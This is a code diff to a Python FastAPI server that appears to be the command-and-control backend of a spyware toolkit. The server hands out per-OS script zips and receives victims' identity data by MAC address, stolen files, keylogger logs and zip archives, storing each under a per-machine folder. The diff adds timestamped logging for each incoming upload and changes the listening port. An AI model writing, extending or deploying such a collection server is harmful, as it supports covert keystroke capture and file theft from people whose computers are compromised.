@@ -7,6 +7,7 @@ from fastapi.responses import FileResponse # to send script zips
 from contextlib import ExitStack # to close files properly
 from typing import List # to make file receiving work
 from datetime import datetime, timezone # anything related to classification by time
+import json
 
 app = FastAPI() # make the server
 
@@ -17,6 +18,8 @@ zip_location = {'win':'resources/win_scripts.zip', # locations of script zip fil
 @app.get("/scripts")
 async def scripts_zip(request: Request): # send the script zips
     headers = request.headers
+    time = str(datetime.now(timezone.utc))[:-13]
+    print(f"Sending scripts to {request.client.host} | {time}")
     if 'win' in headers['os']:
         return FileResponse(zip_location['win'], media_type='application/zip', filename=zip_location['win'])
     elif 'linux' == headers['os']:
@@ -27,6 +30,8 @@ async def scripts_zip(request: Request): # send the script zips
 @app.post("/identity")
 async def identity(request: Request):
     information = await request.json() # get sent information
+    time = str(datetime.now(timezone.utc))[:-13]
+    print(f"Receiving identity from {information['mac']} | {time}")
     os.makedirs(information['mac'], exist_ok=True) # make a directory for the computer
     if not os.path.exists(information['mac']+'information.txt'): # check if the information file doesnt already exist
         with open(information['mac']+'/information.txt', 'w') as f:
@@ -59,6 +64,8 @@ async def identity(request: Request):
 @app.post("/")
 async def get_files(request: Request, files: List[UploadFile] = File(...)): # to recieve any amount of files of any type
     mac = request.headers['mac']
+    time = str(datetime.now(timezone.utc))[:-13]
+    print(f"Receiving files from {mac} | {time}")
     os.makedirs(mac, exist_ok=True) # recreate the directory of the mac address although it was created just to be safe if it was deleted by accident
     with ExitStack() as stack:
         for file in files: # go through all the files sent
@@ -71,6 +78,8 @@ async def get_files(request: Request, files: List[UploadFile] = File(...)): # to
 @app.post("/log")
 async def get_keylogger_log(request: Request, file: UploadFile = File(...)): # to receive keylogger logs
     mac = request.headers['mac']
+    time = str(datetime.now(timezone.utc))[:-13]
+    print(f"Receiving keylogger log from {mac} | {time}")
     os.makedirs(mac, exist_ok=True) # recreate the directory of the mac address although it was created just to be safe if it was deleted by accident
     os.makedirs(f"{mac}/keylogger-log", exist_ok=True) # make a directory for keylogger logs for organization
     contents = await file.read() # get file contents
@@ -81,8 +90,10 @@ async def get_keylogger_log(request: Request, file: UploadFile = File(...)): # t
 @app.post("/zip")
 async def handle_zip(request: Request, file: UploadFile = File(...)): # to recieve zip files you want to unpack
     mac = request.headers['mac']
+    time = str(datetime.now(timezone.utc))[:-13]
+    print(f"Receiving zip file from {mac} | {time}")
     os.makedirs(mac, exist_ok=True)  # make a directory for the IP that sent the file for organization
-    zip_name = f"{mac}/{file.filename}" # make the zip name so its placed in a folder of the IP that sent it
+    zip_name = f"{mac}/{file.filename}" # make the zip name so it's placed in a folder of the IP that sent it
     with open(zip_name, "wb") as zip:
         zip.write(await file.read()) # make the zip file that was received
         zip.close() # close the zip file to free up memory
@@ -104,6 +115,8 @@ async def handle_zip(request: Request, file: UploadFile = File(...)): # to recie
 @app.post("/special_files")
 async def receive_special_files(request: Request, file: UploadFile = File(...)): # to recieve zip files you want to unpack
     mac = request.headers['mac']
+    time = str(datetime.now(timezone.utc))[:-13]
+    print(f"Receiving special files from {mac} | {time}")
     os.makedirs(mac, exist_ok=True)  # make a directory for the IP that sent the file for organization
     os.makedirs(f"{mac}/special_files", exist_ok=True)  # make the directory the special files should go to
     time = str(datetime.now(timezone.utc))[:-13].replace(':','.')  # get the current utc time, remove milliseconds portion, and switch colons to periods since you cant use colons in file names
@@ -112,4 +125,5 @@ async def receive_special_files(request: Request, file: UploadFile = File(...)):
         zip.write(await file.read())  # make the zip file that was received
         zip.close()  # close the zip file to free up memory
 
-uvicorn.run(app, host="0.0.0.0", port=3285) # start the server
+
+uvicorn.run(app, host="0.0.0.0", port=8000) # start the server
